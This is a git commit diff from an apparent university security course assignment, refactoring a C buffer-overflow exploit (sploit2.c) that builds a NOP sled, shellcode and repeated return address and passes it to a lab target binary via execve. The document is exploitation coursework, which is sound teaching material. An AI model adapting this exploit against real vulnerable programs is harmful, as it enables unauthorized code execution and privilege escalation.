979f0cace0d18edb7fc39d28499bae64d2336dc9
justinhalford <justinhalford@gmail.com>
2024-05-10 18:31:19 -0400

    may 7

--- cs5435-hw4/sploits/sploit2.c
+++ cs5435-hw4/sploits/sploit2.c
@@ -6,29 +6,39 @@
 #include "shellcode.h"
 
 #define TARGET "/srv/target2"
-const int BUF_SIZE = 409, OFFSET = 201;
-const uint32_t RET_ADDR = 0xffffdb5c;
 
-void fill(char *buffer) {
-    for (int i = 0; i < BUF_SIZE - 1; ++i) {
-        buffer[i] = (i < OFFSET || i >= OFFSET + sizeof(shellcode) - 1) ? 0x90 : shellcode[i - OFFSET];
+const int BUFFER_SIZE = 409;
+const int SHELLCODE_OFFSET = 201;
+const uint32_t RETURN_ADDRESS = 0xffffdb5c;
+
+void preparePayload(char *buffer) {
+    memset(buffer, 0x90, BUFFER_SIZE - 1);
+    memcpy(buffer + SHELLCODE_OFFSET, shellcode, sizeof(shellcode) - 1);
+
+    for (int i = SHELLCODE_OFFSET + sizeof(shellcode) - 1; i < BUFFER_SIZE - 1; i += 4) {
+        *(uint32_t *)(buffer + i) = RETURN_ADDRESS;
     }
-    uint32_t *ptr = (uint32_t *)(buffer + OFFSET + sizeof(shellcode) - 1);
-    while ((char *)ptr < buffer + BUF_SIZE - 1) {
-        *ptr++ = RET_ADDR;
-    }
-    buffer[BUF_SIZE - 1] = '\0';
+
+    buffer[BUFFER_SIZE - 1] = '\0';
 }
 
-int main(void) {
-    char *args[4], *env[1], payload[BUF_SIZE];
-    fill(payload);
+int main(void)
+{
+    char *args[4];
+    char *env[1];
+    char payload[BUFFER_SIZE];
+
+    preparePayload(payload);
+
     args[0] = TARGET;
     args[1] = payload;
     args[2] = "65935";
     args[3] = NULL;
+
     env[0] = NULL;
+
     execve(TARGET, args, env);
     fprintf(stderr, "execve failed.\n");
+
     return 0;
 }
